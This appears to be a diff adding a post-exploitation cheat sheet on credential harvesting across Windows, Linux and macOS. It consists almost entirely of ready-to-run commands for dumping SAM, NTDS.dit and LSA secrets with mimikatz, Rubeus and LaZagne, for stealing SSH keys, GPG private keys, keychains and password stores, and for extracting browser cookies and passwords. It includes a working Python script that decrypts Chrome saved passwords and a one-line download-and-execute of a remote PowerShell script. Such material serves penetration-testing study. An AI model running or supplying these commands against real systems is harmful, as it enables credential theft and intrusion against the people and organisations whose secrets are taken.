+reg save HKLM\SYSTEM SYSTEM.hive
+reg save HKLM\SECURITY SECURITY.hive
+
+REM Export specific keys
+reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" winlogon.reg
+
+REM VNC passwords
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
+
+REM SNMP community strings
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
+
+REM Putty sessions
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+REM WiFi passwords (also see netsh below)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+
+REM Autologon credentials
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
+```
+
+**PowerShell Registry Credentials**
+
+```powershell
+# Autologon credentials
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# Recently used credentials
+Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+
+# Saved RDP credentials
+Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse
+
+# Credential Manager
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+$credman = New-Object -TypeName PSCredentialManager.CredentialStore
+$credman.GetCredentials()
+
+# DPAPI blobs in registry
+Get-ChildItem "HKCU:\Software\Microsoft\Protected Storage System Provider" -Recurse
+```
+
+**Credential Manager Dumping**
+
+```cmd
+REM List stored credentials
+cmdkey /list
+
+REM VaultCmd
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials"
+vaultcmd /listcreds:"Web Credentials"
+vaultcmd /listproperties
+
+REM Windows Credential Manager files
+dir /a %userprofile%\AppData\Local\Microsoft\Credentials\
+dir /a %userprofile%\AppData\Roaming\Microsoft\Credentials\
+dir /a C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
+
+REM Dump with mimikatz
+mimikatz # vault::list
+mimikatz # vault::cred /patch
+```
+
+**PowerShell Credential Dumping**
+
+```powershell
+# Invoke-CredentialInjection
+Import-Module .\Invoke-CredentialInjection.ps1
+Invoke-CredentialInjection
+
+# Get-Credential PowerShell prompt (social engineering)
+$cred = Get-Credential
+$cred.GetNetworkCredential().Password
+
+# SessionGopher (find stored sessions and passwords)
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Thorough
+
+# LaZagne (password recovery tool)
+.\lazagne.exe all
+
+# SharpDPAPI
+.\SharpDPAPI.exe credentials
+.\SharpDPAPI.exe masterkeys
+.\SharpDPAPI.exe machinemasterkeys
+.\SharpDPAPI.exe machinetriage
+.\SharpDPAPI.exe triage
+```
+
+**SAM and SYSTEM Extraction**
+
+```cmd
+REM Volume Shadow Copy method
+vssadmin list shadows
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
+
+REM Using reg save (requires admin)
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+
+REM Parse with secretsdump.py (Impacket)
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+REM Parse with samdump2
+samdump2 SYSTEM SAM
+```
+
+**NTDS.dit Extraction (Domain Controller)**
+
+```cmd
+REM Using ntdsutil
+ntdsutil
+activate instance ntds
+ifm
+create full C:\temp\ntds
+quit
+quit
+
+REM Using vssadmin
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
+
+REM Extract hashes with secretsdump.py
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+REM Using mimikatz (DCSync)
+mimikatz # lsadump::dcsync /domain:<domain> /all /csv
+```
+
+**Network Credentials**
+
+```cmd
+REM WiFi passwords
+netsh wlan show profiles
+netsh wlan show profile name="<SSID>" key=clear
+
+REM All WiFi passwords
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+
+REM VPN credentials
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+rasdial
+
+REM Cached RDP credentials
+cmdkey /list | findstr Target
+```
+
+**PowerShell Network Credentials**
+
+```powershell
+# WiFi passwords
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{Name=$name;Password=$pass}}
+
+# Saved browser passwords (requires modules)
+Import-Module .\Get-WebCredentials.ps1
+Get-WebCredentials
+
+# IE/Edge saved passwords
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll()
+```
+
+**Application-Specific Credentials**
+
+```cmd
+REM FileZilla
+type "%appdata%\FileZilla\recentservers.xml"
+type "%appdata%\FileZilla\sitemanager.xml"
+
+REM WinSCP
+reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"
+
+REM Git
+type %userprofile%\.git-credentials
+type %userprofile%\.gitconfig
+
+REM AWS CLI
+type %userprofile%\.aws\credentials
+type %userprofile%\.aws\config
+
+REM Azure CLI
+type %userprofile%\.azure\azureProfile.json
+
+REM Slack tokens
+dir /s /b %userprofile%\AppData\Roaming\Slack\Cookies
+dir /s /b %userprofile%\AppData\Roaming\Slack\Local Storage\leveldb
+
+REM Discord tokens
+findstr /s /i "token" "%appdata%\Discord\Local Storage\leveldb\*.ldb"
+
+REM Database clients
+type "%appdata%\MySQL\Workbench\sql_history"
+type "%appdata%\MySQL\Workbench\server_instances.xml"
+```
+
+**Token Manipulation**
+
+```powershell
+# Incognito (Mimikatz alternative)
+.\incognito.exe list_tokens -u
+.\incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+
+# PowerShell token manipulation
+Import-Module .\Invoke-TokenManipulation.ps1
+Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
+Invoke-TokenManipulation -Enumerate
+
+# Get available tokens
+Get-Process | Select-Object Name,Id,Handle | Where-Object {$_.Handle -ne 0}
+```
+
+**Memory Analysis for Credentials**
+
+```powershell
+# Dump all process memory
+Get-Process | ForEach-Object {
+    $proc = $_
+    $dumpFile = "C:\dumps\$($proc.Name)_$($proc.Id).dmp"
+    try {
+        .\procdump.exe -accepteula -ma $proc.Id $dumpFile
+    } catch {}
+}
+
+# Search memory dumps for patterns
+Select-String -Path "C:\dumps\*.dmp" -Pattern "password|pwd|secret" -CaseSensitive:$false
+
+# PowerShell runspace credentials
+Get-Runspace | ForEach-Object {
+    $_.SessionStateProxy.PSVariable.Get("*credential*")
+}
+```
+
+**Kerberos Ticket Extraction**
+
+```cmd
+REM List tickets
+klist
+klist sessions
+klist tgt
+
+REM Export tickets with mimikatz
+mimikatz # sekurlsa::tickets /export
+
+REM Rubeus ticket extraction
+.\Rubeus.exe dump
+.\Rubeus.exe dump /luid:0x3e7
+.\Rubeus.exe klist
+.\Rubeus.exe triage
+
+REM Inject ticket
+.\Rubeus.exe ptt /ticket:<base64_ticket>
+```
+
+## Important Subtopics
+
+**Active Directory Enumeration** - comprehensive AD reconnaissance including users, groups, trusts, ACLs, and GPO analysis **Container and Virtualization Escape** - Docker, Kubernetes, and VM breakout techniques post-compromise **Lateral Movement Preparation** - identifying pivot points, network segmentation, and accessible hosts **Data Exfiltration Channels** - covert data extraction methods and staging techniques
+
+---
+
+## Password Store Extraction
+
+### Windows Credential Manager
+
+**Command-Line Extraction**
+
+```powershell
+# List stored credentials
+cmdkey /list
+
+# Export credentials (requires admin)
+rundll32.exe keymgr.dll,KRShowKeyMgr
+
+# VaultCmd (Windows credential vault)
+vaultcmd /listcreds:"Windows Credentials" /all
+vaultcmd /listcreds:"Web Credentials" /all
+
+# PowerShell credential extraction
+$creds = Get-WmiObject -Namespace "root\cimv2" -Class Win32_UserProfile
+foreach($cred in $creds) {
+    Write-Host "User: $($cred.LocalPath)"
+}
+```
+
+**Mimikatz Credential Extraction**
+
+```powershell
+# Load mimikatz
+.\mimikatz.exe
+
+# Extract credentials from memory
+privilege::debug
+sekurlsa::logonpasswords
+
+# Extract Kerberos tickets
+sekurlsa::tickets
+
+# Extract credential manager passwords
+vault::cred /patch
+
+# DPAPI credential extraction
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\*"
+
+# LSA secrets
+lsadump::secrets
+
+# SAM database
+lsadump::sam
+
+# Extract domain cached credentials
+lsadump::cache
+```
+
+**LaZagne - Multi-Platform Password Recovery**
+
+```bash
+# Windows - All modules
+laZagne.exe all
+
+# Specific categories
+laZagne.exe browsers
+laZagne.exe wifi
+laZagne.exe databases
+laZagne.exe sysadmin
+laZagne.exe git
+laZagne.exe memory
+
+# Output to JSON
+laZagne.exe all -oJ -output results.json
+
+# Verbose output
+laZagne.exe all -v
+
+# Linux version
+python3 laZagne.py all
+python3 laZagne.py browsers
+```
+
+**Windows Credential Files Location**
+
+```powershell
+# Credential Manager files
+%LOCALAPPDATA%\Microsoft\Credentials\*
+%APPDATA%\Microsoft\Credentials\*
+
+# Vault files
+%LOCALAPPDATA%\Microsoft\Vault\*
+%APPDATA%\Microsoft\Vault\*
+
+# Protected storage
+%APPDATA%\Microsoft\Protect\*
+
+# List all credential files
+dir /s /b %LOCALAPPDATA%\Microsoft\Credentials\
+dir /s /b %APPDATA%\Microsoft\Protect\
+```
+
+### Linux Password Stores
+
+**GNOME Keyring Extraction**
+
+```bash
+# Keyring location
+~/.local/share/keyrings/
+
+# List keyrings
+ls -la ~/.local/share/keyrings/
+
+# Dump login keyring (requires password)
+python3 -c "import secretstorage; bus = secretstorage.dbus_init(); collection = secretstorage.get_default_collection(bus); for item in collection.get_all_items(): print(item.get_label(), item.get_secret())"
+
+# Using gnome-keyring-dump
+git clone https://github.com/juuso/gnome-keyring-dump.git
+python3 gnome-keyring-dump/gnome-keyring-dump.py
+```
+
+**KWallet Extraction (KDE)**
+
+```bash
+# KWallet location
+~/.local/share/kwalletd/
+
+# List wallets
+ls -la ~/.local/share/kwalletd/
+
+# Extract with kwalletcli
+kwalletcli -f kdewallet -e "Entry Name"
+
+# Dump entire wallet (if unlocked)
+qdbus org.kde.kwalletd /modules/kwalletd org.kde.KWallet.wallets
+```
+
+**Pass (Password Store)**
+
+```bash
+# Password store location
+~/.password-store/
+
+# List all passwords
+pass ls
+
+# Show password
+pass show service/account
+
+# GPG-encrypted, extract GPG keys first
+gpg --list-secret-keys
+gpg --export-secret-keys > private_keys.asc
+
+# Copy entire password store
+tar -czf passwords.tar.gz ~/.password-store/
+```
+
+**SSH Keys and Config**
+
+```bash
+# Private keys location
+~/.ssh/
+
+# List all SSH keys
+ls -la ~/.ssh/id_*
+
+# SSH config
+cat ~/.ssh/config
+
+# Known hosts
+cat ~/.ssh/known_hosts
+
+# Authorized keys
+cat ~/.ssh/authorized_keys
+
+# Copy all SSH data
+tar -czf ssh_data.tar.gz ~/.ssh/
+
+# Check for passphrase-protected keys
+for key in ~/.ssh/id_*; do
+    if [[ -f "$key" ]] && [[ ! "$key" == *.pub ]]; then
+        echo "Testing $key"
+        ssh-keygen -y -f "$key" 2>&1 | grep -q "passphrase" && echo "[!] Passphrase protected" || echo "[+] No passphrase"
+    fi
+done
+```
+
+### macOS Keychain Extraction
+
+**Security Command-Line**
+
+```bash
+# List all keychains
+security list-keychains
+
+# Dump keychain passwords (requires keychain password)
+security dump-keychain -d login.keychain
+
+# Find generic password
+security find-generic-password -ga "account_name"
+
+# Find internet password
+security find-internet-password -ga "account_name"
+
+# Export certificates
+security find-certificate -a -p > certificates.pem
+
+# Dump all passwords (requires authorization)
+security dump-keychain login.keychain-db
+```
+
+**Chain Breaker - Keychain Extraction Tool**
+
+```bash
+# Install
+git clone https://github.com/n0fate/chainbreaker.git
+cd chainbreaker
+
+# Extract passwords from keychain
+python3 chainbreaker.py -p keychain_password ~/Library/Keychains/login.keychain-db
+
+# Dump to CSV
+python3 chainbreaker.py -p keychain_password ~/Library/Keychains/login.keychain-db -o keychain.csv
+```
+
+### Database Credential Files
+
+**Common Database Credential Locations**
+
+**MySQL/MariaDB**
+
+```bash
+# Linux
+/etc/mysql/my.cnf
+~/.my.cnf
+~/.mysql_history
+
+# Windows
+C:\ProgramData\MySQL\MySQL Server 8.0\my.ini
+%APPDATA%\MySQL\my.ini
+
+# Extract credentials
+grep -E "user|password" /etc/mysql/my.cnf
+grep -E "user|password" ~/.my.cnf
+```
+
+**PostgreSQL**
+
+```bash
+# Password file
+~/.pgpass
+# Format: hostname:port:database:username:password
+
+# Service file
+~/.pg_service.conf
+
+# Environment variables
+echo $PGPASSWORD
+echo $PGUSER
+
+# Connection history
+~/.psql_history
+```
+
+**MongoDB**
+
+```bash
+# Config file
+/etc/mongod.conf
+~/.mongorc.js
+
+# Connection strings in bash history
+cat ~/.bash_history | grep mongodb://
+
+# Format: mongodb://username:password@host:port/database
+```
+
+**Redis**
+
+```bash
+# Config file
+/etc/redis/redis.conf
+
+# Look for requirepass directive
+grep "requirepass" /etc/redis/redis.conf
+
+# Authentication in config
+grep -E "user|password|requirepass" /etc/redis/redis.conf
+```
+
+**MSSQL**
+
+```powershell
+# Connection strings in registry
+reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s | findstr "ConnectionString"
+
+# SQL Server config
+type "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\mssql.conf"
+```
+
+### Git Credential Storage
+
+**Git Credentials**
+
+```bash
+# Credential helper cache
+git config --get credential.helper
+
+# Stored credentials
+cat ~/.git-credentials
+# Format: https://username:password@github.com
+
+# Git config
+cat ~/.gitconfig | grep -A 5 "\[credential\]"
+
+# Windows Credential Manager (Git for Windows)
+git credential-manager version
+cmdkey /list | findstr git
+
+# Extract from git config
+git config --list | grep credential
+```
+
+### Application-Specific Credentials
+
+**FTP Clients**
+
+```bash
+# FileZilla
+# Linux: ~/.config/filezilla/
+# Windows: %APPDATA%\FileZilla\
+
+# Extract FileZilla credentials
+cat ~/.config/filezilla/recentservers.xml
+cat ~/.config/filezilla/sitemanager.xml
+
+# Windows
+type %APPDATA%\FileZilla\recentservers.xml
+type %APPDATA%\FileZilla\sitemanager.xml
+
+# Decode base64 passwords in XML
+grep -oP 'Pass=".*?"' sitemanager.xml | cut -d'"' -f2 | base64 -d
+```
+
+**WinSCP**
+
+```powershell
+# Registry location
+reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
+
+# Extract and decrypt (stored in registry)
+# Password is encrypted with username and hostname as key
+
+# Using WinSCP password decryptor
+# https://github.com/dzzie/winscp_password_recover
+```
+
+**PuTTY**
+
+```powershell
+# Registry location
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+
+# Extract proxy passwords
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /v ProxyPassword
+
+# Private keys
+dir /s /b %USERPROFILE%\*.ppk
+
+# Convert PPK to OpenSSH format
+puttygen private_key.ppk -O private-openssh -o id_rsa
+```
+
+**RDP Credentials**
+
+```powershell
+# Saved RDP connections
+dir /s /b %USERPROFILE%\*.rdp
+
+# Extract credentials from RDP files
+findstr /si password *.rdp
+
+# Windows Credential Manager for RDP
+cmdkey /list | findstr "TERMSRV"
+
+# Mimikatz RDP credential extraction
+privilege::debug
+ts::logonpasswords
+```
+
+---
+
+## Browser Credential Extraction
+
+### Google Chrome / Chromium
+
+**Windows Chrome Passwords**
+
+```powershell
+# Database location
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
+
+# Copy database (Chrome must be closed)
+copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" LoginData.db
+
+# SQLite query
+sqlite3 LoginData.db "SELECT origin_url, username_value, password_value FROM logins"
+
+# Passwords are encrypted with DPAPI
+# Master key location
+%LOCALAPPDATA%\Google\Chrome\User Data\Local State
+```
+
+**Chrome Password Decryption Script (Python)**
+
+```python
+import os
+import json
+import base64
+import sqlite3
+import shutil
+from Crypto.Cipher import AES
+import win32crypt
+
+def get_master_key():
+    # Chrome Local State path
+    local_state_path = os.path.join(os.environ['LOCALAPPDATA'],
+                                     'Google\\Chrome\\User Data\\Local State')
+    
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    
+    # Decode encrypted key
+    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+    
+    # Decrypt with DPAPI
+    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return master_key
+
+def decrypt_password(encrypted_password, master_key):
+    try:
+        # Version
+        iv = encrypted_password[3:15]
+        encrypted_password = encrypted_password[15:]
+        
+        # Create cipher
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        
+        # Decrypt
+        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
+        return decrypted_password
+    except Exception as e:
+        return str(e)
+
+def extract_chrome_passwords():
+    # Copy database
+    db_path = os.path.join(os.environ['LOCALAPPDATA'],
+                           'Google\\Chrome\\User Data\\Default\\Login Data')
+    temp_db = 'ChromeData.db'
+    shutil.copyfile(db_path, temp_db)
+    
+    # Get master key
+    master_key = get_master_key()
+    
+    # Connect to database
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    
+    # Query passwords
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    
+    for row in cursor.fetchall():
+        url = row[0]
+        username = row[1]
+        encrypted_password = row[2]
+        
+        if encrypted_password:
+            password = decrypt_password(encrypted_password, master_key)
+            print(f"URL: {url}")
+            print(f"Username: {username}")
+            print(f"Password: {password}\n")
+    
+    conn.close()
+    os.remove(temp_db)
+
+extract_chrome_passwords()
+```
+
+**Linux Chrome Passwords**
+
+```bash
+# Database location
+~/.config/google-chrome/Default/Login Data
+
+# Copy and query
+cp ~/.config/google-chrome/Default/Login\ Data /tmp/LoginData.db
+sqlite3 /tmp/LoginData.db "SELECT origin_url, username_value, password_value FROM logins"
+
+# Passwords encrypted with libsecret/gnome-keyring
+# Key stored in keyring with label "Chrome Safe Storage"
+```
+
+**Chrome Cookies**
+
+```powershell
+# Windows cookies location
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
+
+# Copy and query
+copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" Cookies.db
+sqlite3 Cookies.db "SELECT host_key, name, encrypted_value FROM cookies"
+
+# Linux
+~/.config/google-chrome/Default/Cookies
+```
+
+**Chrome History**
+
+```bash
+# Windows
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\History
+
+# Linux
+~/.config/google-chrome/Default/History
+
+# Extract URLs
+sqlite3 History "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100"
+
+# Extract downloads
+sqlite3 History "SELECT target_path, tab_url, start_time, end_time FROM downloads"
+```
+
+**Chrome Extensions**
+
+```bash
+# Windows
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\
+
+# Linux
+~/.config/google-chrome/Default/Extensions/
+
+# List installed extensions
+ls -la "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\"
+
+# Look for password managers, crypto wallets, etc.
+```
+
+### Mozilla Firefox
+
+**Firefox Passwords**
+
+```bash
+# Profile location
+# Windows: %APPDATA%\Mozilla\Firefox\Profiles\
+# Linux: ~/.mozilla/firefox/
+
+# Find profile directory
+ls ~/.mozilla/firefox/*.default-release/
+
+# Password files
+logins.json          # Encrypted passwords
+key4.db              # Master password protection
+```
+
+**Firefox Password Extraction Script (Python)**
+
+```python
+import json
+import sqlite3
+import base64
+from Crypto.Cipher import DES3
+from hashlib import sha1
+import hmac
+
+def extract_firefox_passwords(profile_path):
+    # Read logins.json
+    logins_file = f"{profile_path}/logins.json"
+    
+    with open(logins_file, 'r') as f:
+        logins_data = json.load(f)
+    
+    # Connect to key4.db
+    key_db = f"{profile_path}/key4.db"
+    conn = sqlite3.connect(key_db)
+    cursor = conn.cursor()
+    
+    # Extract encryption key
+    cursor.execute("SELECT item1, item2 FROM metadata WHERE id='password'")
+    key_data = cursor.fetchone()
+    
+    # Process each login
+    for login in logins_data['logins']:
+        url = login['hostname']
+        username = login['encryptedUsername']
+        password = login['encryptedPassword']
+        
+        print(f"URL: {url}")
+        print(f"Username: [encrypted]")
+        print(f"Password: [encrypted]\n")
+    
+    conn.close()
+
+# Usage
+profile_path = "/home/user/.mozilla/firefox/xxxxxxxx.default-release"
+extract_firefox_passwords(profile_path)
+```
+
+**Firefox Decrypt Tool**
+
+```bash
+# Install firefox_decrypt
+git clone https://github.com/unode/firefox_decrypt.git
+cd firefox_decrypt
+
+# Extract passwords
+python3 firefox_decrypt.py ~/.mozilla/firefox/
+
+# Specify profile
+python3 firefox_decrypt.py ~/.mozilla/firefox/xxxxxxxx.default-release/
+
+# Non-interactive (if no master password)
+python3 firefox_decrypt.py --non-interactive ~/.mozilla/firefox/
+```
+
+**Firefox Cookies**
+
+```bash
+# Cookie database
+~/.mozilla/firefox/xxxxxxxx.default-release/cookies.sqlite
+
+# Extract cookies
+sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies"
+
+# Session cookies
+~/.mozilla/firefox/xxxxxxxx.default-release/sessionstore.jsonlz4
+
+# Decompress session file (LZ4 compressed)
+pip install lz4
+python3 -c "import lz4.block; import sys; sys.stdout.buffer.write(lz4.block.decompress(open('sessionstore.jsonlz4','rb').read()[8:]))" > sessionstore.json
+```
+
+**Firefox History**
+
+```bash
+# History database
+~/.mozilla/firefox/xxxxxxxx.default-release/places.sqlite
+
+# Extract URLs
+sqlite3 places.sqlite "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY visit_count DESC LIMIT 100"
+
+# Bookmarks
+sqlite3 places.sqlite "SELECT moz_places.url, moz_bookmarks.title FROM moz_places, moz_bookmarks WHERE moz_bookmarks.fk=moz_places.id"
+
+# Downloads
+sqlite3 places.sqlite "SELECT content FROM moz_annos WHERE anno_attribute_id=3"
+```
+
+### Microsoft Edge
+
+**Edge Chromium Passwords**
+
+```powershell
+# Database location (Chromium-based)
+%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
+
+# Same extraction method as Chrome
+# Copy database
+copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data" EdgeLogin.db
+
+# Master key
+%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
+```
+
+**Edge Legacy (Pre-Chromium)**
+
+```powershell
+# Windows Vault storage
+vaultcmd /listcreds:"Web Credentials" /all
+
+# Extract with mimikatz
+vault::list
+vault::cred /patch
+```
+
+### Safari (macOS)
+
+**Safari Passwords**
+
+```bash
+# Keychain location
+~/Library/Keychains/login.keychain-db
+
+# Extract with security command
+security find-internet-password -ga "website.com"
+
+# Safari password database
+~/Library/Safari/Passwords.db
+
+# Requires macOS keychain password to decrypt
+```
+
+**Safari Cookies and History**
+
+```bash
+# Cookies
+~/Library/Cookies/Cookies.binarycookies
+
+# History
+~/Library/Safari/History.db
+
+# Extract history
+sqlite3 ~/Library/Safari/History.db "SELECT url, visit_time FROM history_visits JOIN history_items ON history_visits.history_item=history_items.id"
+```
+
+### Internet Explorer
+
+**IE Passwords**
+
+```powershell
+# Stored in Windows Vault
+vaultcmd /listcreds:"Web Credentials" /all
+
+# Using mimikatz
+vault::cred
+
+# IE Protected Storage (older versions)
+# Stored in registry
+reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s
+```
+
+**IE History**
+
+```powershell
+# History location
+%LOCALAPPDATA%\Microsoft\Windows\WebCache\WebCacheV01.dat
+
+# Extract with ESEDatabaseView
+# https://www.nirsoft.net/utils/ese_database_view.html
+
+# Typed URLs (address bar)
+reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
+```
+
+### Automated Browser Credential Tools
+
+**HackBrowserData (Multi-Browser)**
+
+```bash
+# Install
+git clone https://github.com/moonD4rk/HackBrowserData.git
+cd HackBrowserData
+
+# Windows
+hack-browser-data.exe
+
+# Linux
+./hack-browser-data
+
+# Export to JSON
+./hack-browser-data -f json -o results.json
+
+# Specific browsers
+./hack-browser-data -b chrome -b firefox
+```
+
+**BrowserGather**
+
+```powershell
+# PowerShell script
+# Download from GitHub
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sekirkity/BrowserGather/master/BrowserGather.ps1')
+
+# Run
+Invoke-BrowserGather
+```
+
+**SharpChrome (Chrome Password Dumper)**
+
+```powershell
+# Compile or download binary
+# https://github.com/GhostPack/SharpDPAPI
+
+# Extract Chrome passwords
+.\SharpChrome.exe logins /unprotect
+
+# Extract cookies
+.\SharpChrome.exe cookies /unprotect
+```
+
+---
+
+## File System Analysis
+
+### Interesting File Locations
+
+**Windows Sensitive Directories**
+
+```powershell
+# User profiles
+dir /s /b C:\Users\*\Desktop\*.txt
+dir /s /b C:\Users\*\Documents\*.doc*
+dir /s /b C:\Users\*\Downloads\
+
+# Program data
+dir /s /b C:\ProgramData\*.conf
+dir /s /b C:\ProgramData\*.config
+dir /s /b C:\ProgramData\*.xml
+
+# IIS web roots
+dir /s /b C:\inetpub\wwwroot\web.config
+dir /s /b C:\inetpub\wwwroot\*.config
+
+# Apache/nginx
+dir /s /b C:\Apache*\conf\httpd.conf
+dir /s /b C:\nginx\conf\nginx.conf
+
+# Application configs
+dir /s /b "C:\Program Files\*\*.conf"
+dir /s /b "C:\Program Files (x86)\*\*.config"
+```
+
+**Linux Sensitive Directories**
+
+```bash
+# Home directories
+find /home -type f -name "*.txt" 2>/dev/null
+find /home -type f -name "*.doc*" 2>/dev/null
+find /home -type f -name "*.pdf" 2>/dev/null
+
+# Configuration files
+find /etc -type f -name "*.conf" 2>/dev/null
+find /etc -type f -name "*.config" 2>/dev/null
+
+# Web roots
+find /var/www -type f -name "*.config" 2>/dev/null
+find /var/www -type f -name "*.php" 2>/dev/null
+
+# Backup directories
+find / -type d -name "*backup*" 2>/dev/null
+find / -type d -name "*bak" 2>/dev/null
+
+# Temporary files
+find /tmp -type f 2>/dev/null
+find /var/tmp -type f 2>/dev/null
+```
+
+### Searching for Sensitive Files
+
+**Password File Search (Windows)**
+
+```powershell
+# Search for password files
+dir /s /b C:\*password*.txt
+dir /s /b C:\*password*.doc*
+dir /s /b C:\*password*.xls*
+dir /s /b C:\*credential*.txt
+dir /s /b C:\*secret*.txt
+
+# Database files
+dir /s /b C:\*.sql
+dir /s /b C:\*.db
+dir /s /b C:\*.sqlite
+dir /s /b C:\*.mdb
+
+# Backup files
+dir /s /b C:\*.bak
+dir /s /b C:\*.backup
+dir /s /b C:\*.old
+
+# Configuration files
+dir /s /b C:\*.config
+dir /s /b C:\*.conf
+dir /s /b C:\*.ini
+dir /s /b C:\*.xml
+```
+
+**Password File Search (Linux)**
+
+```bash
+# Find files containing "password"
+grep -r -i "password" /home 2>/dev/null
+grep -r -i "password" /etc 2>/dev/null
+grep -r -i "password" /var/www 2>/dev/null
+
+# Find credential files
+find / -name "*password*" -type f 2>/dev/null
+find / -name "*credential*" -type f 2>/dev/null
+find / -name "*secret*" -type f 2>/dev/null
+find / -name "*.key" -type f 2>/dev/null
+
+# Database files
+find / -name "*.sql" -type f 2>/dev/null
+find / -name "*.db" -type f 2>/dev/null
+find / -name "*.sqlite*" -type f 2>/dev/null
+
+# Backup files
+find / -name "*.bak" -type f 2>/dev/null
+find / -name "*backup*" -type f 2>/dev/null
+find / -name "*.old" -type f 2>/dev/null
+```
+
+### Content-Based File Search
+
+**Windows Content Search**
+
+```powershell
+# Search for passwords in files
+findstr /si "password" C:\*.txt C:\*.config C:\*.xml
+findstr /si "pwd=" C:\*.config C:\*.xml C:\*.ini
+findstr /si "pass=" C:\*.config C:\*.xml C:\*.ini
+
+# Search for credentials
+findstr /si "username" C:\*.config C:\*.xml
+findstr /si "connectionstring" C:\*.config C:\*.xml
+
+# API keys and tokens
+findstr /si "api_key" C:\*.txt C:\*.config
+findstr /si "apikey" C:\*.txt C:\*.config
+findstr /si "api-key" C:\*.txt C:\*.config
+findstr /si "token" C:\*.txt C:\*.config
+findstr /si "secret" C:\*.txt C:\*.config
+
+# Private keys
+findstr /si "BEGIN RSA PRIVATE KEY" C:\*.txt C:\*.pem C:\*.key
+findstr /si "BEGIN PRIVATE KEY" C:\*.txt C:\*.pem C:\*.key
+```
+
+**Linux Content Search**
+
+```bash
+# Search for passwords
+grep -r -i "password\s*=" / 2>/dev/null | grep -v "Binary"
+grep -r -i "pwd\s*=" / 2>/dev/null | grep -v "Binary"
+grep -r -i "pass\s*=" / 2>/dev/null | grep -v "Binary"
+
+# Database connection strings
+grep -r -i "connectionstring" /var/www /etc /opt 2>/dev/null
+grep -r -i "jdbc:" /var/www /etc /opt 2>/dev/null
+grep -r -i "mysql://" /var/www /etc /opt 2>/dev/null
